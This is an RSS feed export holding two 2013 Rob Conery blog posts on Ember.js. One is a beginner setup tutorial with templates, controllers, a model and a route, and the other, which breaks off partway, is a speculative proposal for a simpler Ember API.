{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/yMrhlO3kWpI/ember-baby-steps","title":"Ember: Baby Steps","published":{"$wrap":"$date","v":1363791600000,"h":"2013-03-20T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>If you read my blog, you know I've been goofing around with quite a few Javascript libraries. Some are easier than others. This time, it's Ember's turn.</p><p><img src='http://wekeroad.com/images/ember_get_started.png'/></p><p><h2>A Bit Steep</h2><p>I figured it's about time to get constructive in terms of getting to know EmberJS. The only reason I haven't up until this point is that I've been very busy with<a href=\"http://tekpub.com/productions/angular\">Tekpub's Angular production</a>.</p><p>So, today's the day. Let's get started.</p><h2>Baby Steps</h2><p>Getting Ember setup is frustrating.<a href=\"http://emberjs.com/guides/\">The Ember guides</a>are focused heavily on concept, not utility. For instance - getting Ember to load (for the uninitiated) is a matter of refreshing until the errors go away. I'll save you that time :).</p><p>Kick open a console (if you're on Linux/Mac) or crack open VS/WebMatrix if you're on a Windows machine. We want a bare application here so let's start by creating a directory:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span></pre></td><td class='code'><pre><code class=''><span class='line'>mkdir hello-ember</span><span class='line'>cd hello-ember</span></code></pre></td></tr></table></div></figure><p>Now we're in our directory. Let's create the pages/directories we'll need:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span></pre></td><td class='code'><pre><code class=''><span class='line'>mkdir js</span><span class='line'>touch index.html</span></code></pre></td></tr></table></div></figure><p>The next step is to get the scripts we'll need. We'll need 3:</p><ul><li>jQuery</li><li>Handlebars</li><li>Ember</li></ul><p>Ember won't work unless you have all three of these. I like to use the jQuery CDN at Google, but you'll need to<a href=\"https://raw.github.com/emberjs/ember.js/release-builds/ember-1.0.0-rc.1.js\">download Ember directly</a>and also<a href=\"https://raw.github.com/wycats/handlebars.js/1.0.0-rc.3/dist/handlebars.js\">Handlebars</a>. Put these files in your<code>js</code>directory.</p><p>Be sure to use the unminified version for development. This goes for any library you're learning - the unminified versions are easy to traverse if you have a debugger, and they typically have helpful debug statements built in.</p><p>Save these files in your<code>js</code>directory.</p><p>Let's add one more file where our application code will go:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class=''><span class='line'>touch js/app.js</span></code></pre></td></tr></table></div></figure><p>Open up the index.html page and stub out our skeleton, with the script references in place:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"cp\">&lt;!DOCTYPE html&gt;</span></span><span class='line'><span class=\"nt\">&lt;html</span><span class=\"na\">lang=</span><span class=\"s\">\"en\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;head&gt;</span></span><span class='line'><span class=\"nt\">&lt;title&gt;</span>Hello Ember<span class=\"nt\">&lt;/title&gt;</span></span><span class='line'><span class=\"nt\">&lt;/head&gt;</span></span><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>Hello Ember<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">src=</span><span class=\"s\">\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/handlebars.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/ember.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/app.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/html&gt;</span></span></code></pre></td></tr></table></div></figure><p>Let's run this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='html'><span class='line'>python -m SimpleHTTPServer</span></code></pre></td></tr></table></div></figure><p>Things should be cycling<a href=\"http://localhost:8000\">on port 8000</a>. If you're on Windows, just hit F5.</p><p>Now let's write some Ember code.</p><h2>Step 1: The Application View</h2><p>Up front: there's a lot of magic that happens behind the scenes with Ember. Just about any tutorial you read will spend 75% of the time explaining the concepts behind Ember, and 25% of the time on actually using it.</p><p>This can be daunting for people who\"want to get a feel\" (like me) and don't like sitting through conceptual lectures. I like to write code to understand a tool - so let's do that and I'll explain what I know along the way.</p><p>Open up js/app.js and create the Ember application:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span></code></pre></td></tr></table></div></figure><p>We have an application, which is a lovely start. We need at least two more things before we know that Ember is even alive and running:</p><ul><li>a View</li><li>a Controller</li></ul><p>The simplest view to create is the overall application view - let's add that to our HTML page, removing the first-level headers:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>This script tag is a Handlebars template. If you don't know what that is: it's just like an ERB template in Rails (or a Razor template in ASP.NET MVC) except it works with Javascript on the client.</p><p>Handlebars is pretty simple to use, and Ember extends some of its functionality to make it work happily with the Ember bits.</p><p>We've identified this template using<code>data-template-name</code>as being the main application viewport. Let's stick something in it.</p><h2>Step 2: The Application Controller</h2><p>If you're familiar with Rails-style MVC, well... forget it. There are many flavors of MVC and we'll be working with Desktop/Smalltalk-80 style here. This confused me greatly, and I still don't know how I feel about it, but it doesn't matter. This is the way Ember works.</p><p>In short:<strong>Controllers in Ember convey data to your templates</strong>.</p><p>To see this let's create our first Controller. Open up app.js:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">ApplicationController</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Controller</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>If you've used Backbone before, this will look very odd. I should also mention that using the ApplicationController like this is not a good idea - I'll fix it in just a second.</p><p>Let's update the view so we can see our data:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h1</span><span class=\"o\">&gt;</span><span class=\"p\">{{</span><span class=\"nx\">greeting</span><span class=\"p\">}}</span><span class=\"o\">&lt;</span><span class=\"err\">/h1&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h3</span><span class=\"o\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">happyThought</span><span class=\"p\">}}</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"err\">/h3&gt;</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>If you're working in Chrome, make sure the console is open by using Cmd-Shift-I (or Ctrl-Shift-I in Windows). If you see any errors here, correct them. It's likely you might have a 404 reference to one of your script files, or you've put them in your page in the wrong order (use my code above for the right order).</p><p>If everything is working: refresh your page - you should see a nice, Wonka greeting.</p><h2>Step 3: Conventions</h2><p>Look back over what we've written. Nowhere did we state\"get this template and render it this way\". Instead, Ember used the name of our template and married it up with the name of our Controller - and it all<em>just worked</em>.</p><p>This is a key bit of understanding with Ember:<strong>Naming things properly is everything</strong>.</p><p>To see this, let's get out of working with our ApplicationController directly.</p><p>First, create a new Controller, we'll call it the\"IndexController\". Don't name it something else - IndexController is what shows by default:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">IndexController</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Controller</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Now, let's update our view so that the application view doesn't have hard-coded values in it:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">outlet</span><span class=\"p\">}}</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"index\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h1</span><span class=\"o\">&gt;</span><span class=\"p\">{{</span><span class=\"nx\">greeting</span><span class=\"p\">}}</span><span class=\"o\">&lt;</span><span class=\"err\">/h1&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h3</span><span class=\"o\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">happyThought</span><span class=\"p\">}}</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"err\">/h3&gt;</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>Refresh your page. You should see the same thing we saw before: a nice Wonka greeting. But what happened here?</p><p>Again: naming conventions at work. The ApplicationController is gone from our code, but it still exists\"behind the scenes\" as Ember created it for us. In the first example (where we worked directly with it) - you can think of that as\"overriding\" the ApplicationController.</p><p>The same goes with the IndexController. It was always there - but we didn't need it. In the second example we essentially\"overrode\" the IndexController and created a view for it.</p><p>The rendered view was then injected into the application view where<code>{{outlet}}</code>sits on the page. You can think of<code>{{outlet}}</code>in the same way that<code>yield</code>is used in Rails.</p><h2>Step 4: Models and Routing</h2><p>We've done some basic stuff here, let's explore the other parts of Ember. Once again, I'll keep it<strong>extremely simple</strong>.</p><p>In app.js, let's define a model. I'll do this by extending an Ember Object:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p><strong>Update</strong>- this code has been changed based on feedback from Tom Dale and comments below.</p><p>Now, let's define a Route. Routes in Ember help to link models to Controllers:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//our app</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">({});</span></span><span class='line'></span><span class='line'><span class=\"c1\">//our model</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'></span><span class='line'><span class=\"c1\">//our route</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">IndexRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This is all the code you should have in app.js. Notice how we have no Controller? We don't need one. This is confusing, but let's make sure things are working - refresh your page and you should see everything working just fine.</p><p>Assuming that it is - what we have here is naming magic at work, again. We've always had an IndexRoute (Ember created it for us since we didn't explicitly declare one) - but this time we wanted to specify a model so we needed to use a Route.</p><p>I mentioned that the Route exists to marry up a Controller to a Model,<strong>but we have no Controller!</strong>This can be maddening: we<em>do have a Controller</em>, we just didn't have to write the code for it: Ember did that for us.</p><p>The Controller that Ember created (the IndexController) was associated to our Route because we kept with the Ember naming magic. That Controller took the model that was available on the Route and\"grafted it\" onto itself, making the data on the model available to our view.</p><h2>Good Job!</h2><p>If you've made it this far, you now know as much as I do. There's a lot happening in the background with Ember; the goal being that the Ember team wants to reduce the tedious\"boilerplate\" code you write with other frameworks, like Backbone.</p><p>This can be a neat thing, it can also be highly confusing if you don't know what's going on.</p><p>I encourage you to play around with Ember and Handlebars now that you have your footing. It's an interesting thought experiment that works well for many developers.</p><p><strong>Note:</strong><em>I'm not an Ember expert by any stretch so if you've found any misstatements or silliness here, please do let me know and I'll adjust.</em></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/yMrhlO3kWpI\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1269}}
{"k":"0000000084","o":"0000015231","v":"001"}
{"_id":1270,"_uid":1270,"_dt":1373742620974,"_s":"1f8facfddc5ceb5d161f37b8860af55e"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/rEbegmNcGV8/ember-what-if-part-1","title":"Ember... What If (Part 1)","published":{"$wrap":"$date","v":1364050800000,"h":"2013-03-23T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>The Ember guys are having a hard week. I promised Tom Dale I'd try and help by \"arm-waving\" an API together that I feel expresses a bit more about the main ideas behind Ember. It's Friday, I've had a beer or two... but I got inspired...</p><p><img src='http://wekeroad.com/images/thinker.jpg'/></p><p><p><em>image from<a href=\"http://therustyshield.wordpress.com/2011/09/02/breakfast-topic-how-long-do-you-take-to-create-a-character/thinker/\">The Rusty Shield</a></em></p><h2>Hello There!</h2><p>Setting a happy tone immediately is job one, in my mind. When you add Ember to a page you want to know it's there, and it's ready for you. Moreover you want to get going writing some code!</p><p>Right now you're stopped immediately with script warnings about including Handlebars and jQuery (if you don't have them installed). Can we make that experience better?</p><p>Yes. Bundle them! Angular bundles jQlite, Ember should bundle Handlebars and the same library. If they can't do that (for whatever reason):<strong>tell me</strong>(using console.log):</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class=''><span class='line'>Ember needs Handlebars and jQuery to run! You can download them directly or just use add these tags above the ember.js script tag:</span><span class='line'>&lt;script src=\"http://cdnjs.cloudflare.com/ajax/libs/handlebars.js/1.0.0-rc.3/handlebars.min.js\"&lt;/script&gt;</span><span class='line'>&lt;script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure><p>How nice is that! I still like the idea of bundling, however.</p><h2>Default App.</h2><p>Ember is all about convention. Convention with naming, with various objects following MVC - what if we flexed that even more.</p><p>The assumption is this:</p><blockquote><p>If you include Ember, you want to build a Javascript application</p></blockquote><p>I think that's a pretty solid assumption. So let's turn this around - instead of writing this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">App</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">()</span></span></code></pre></td></tr></table></div></figure><p>Just make\"App\" exist already! We know that jQuery is a dependency - so go with it and load that statement up by default:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//Part of Ember.js</span></span><span class='line'><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">bootstrap</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">App</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This can be overriden (which keeps in the spirit of Ember) in a new method<code>Ember.bootstrap</code>:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">bootstrap</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">app</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">Tekpub</span><span class=\"p\">.</span><span class=\"nx\">MyApp</span><span class=\"o\">=</span><span class=\"nx\">app</span><span class=\"p\">;</span></span><span class='line'><span class=\"c1\">//config etc.</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>For me, 9 times out of 10 I'll just work with\"App\". No need to change things in my mind and if you need to - just run<code>App.config(function(app){})\"</code>and change things in<code>$(document).ready()</code>.</p><h2>That Naming Thing</h2><p>Right now there are a lot of concepts that hang loosely from a naming scheme. This is a double-whammy that I think makes Ember hard to use.</p><p>What if we reversed this entirely? What if we defined the\"name\" up front? Here's what the Index definition would be (it could easily be\"Post\" or something else):</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span><span class='line-number'>16</span><span class='line-number'>17</span><span class='line-number'>18</span><span class='line-number'>19</span><span class='line-number'>20</span><span class='line-number'>21</span><span class='line-number'>22</span><span class='line-number'>23</span><span class='line-number'>24</span><span class='line-number'>25</span><span class='line-number'>26</span><span class='line-number'>27</span><span class='line-number'>28</span><span class='line-number'>29</span><span class='line-number'>30</span><span class='line-number'>31</span><span class='line-number'>32</span><span class='line-number'>33</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Index</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"c1\">//wrap the notion of an Index in a\"Definition\" object</span></span><span class='line'><span class=\"c1\">//this is clean, and in one place</span></span><span class='line'><span class=\"c1\">//the naming concerns are implied</span></span><span class='line'><span class=\"k\">return</span><span class=\"p\">{</span></span><span class='line'><span class=\"c1\">//all of the below is optional</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"p\">{</span></span><span class='line'><span class=\"c1\">//this is an Ember.Data thing</span></span><span class='line'><span class=\"c1\">//or I can override some methods using</span></span><span class='line'><span class=\"c1\">//my own Ajax stuff with jQuery</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">routes</span><span class=\"o\">:</span><span class=\"p\">[</span></span><span class='line'><span class=\"s2\">\"/:thingy\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"s2\">\"/stuff\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"s2\">\"another-override\"</span></span><span class='line'><span class=\"p\">],</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">model</span><span class=\"p\">,</span><span class=\"nx\">routeParameters</span><span class=\"p\">){</span></span><span class='line'><span class=\"c1\">//route params are available via route.thingy, etc</span></span><span class='line'><span class=\"c1\">//this function is optional and exists for you</span></span><span class='line'><span class=\"c1\">//created by Ember</span></span><span class='line'><span class=\"c1\">//this method is available in my view</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">posts</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"c1\">//fetch from the model and return the result</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'></span><span class='line'><span class=\"c1\">//another...</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">comments</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"c1\">//etc</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">}</span></span></code></pre></td></tr></table></div></figure><p>The view is just a script tag with the id\"index\" in keeping with the spirit of Ember. In the view I can use all the same templating and expect to use whatever method/data that I've declared on my controller.</p><p>The nice thing about this setup is that I'm using the model as a separate idea - it's 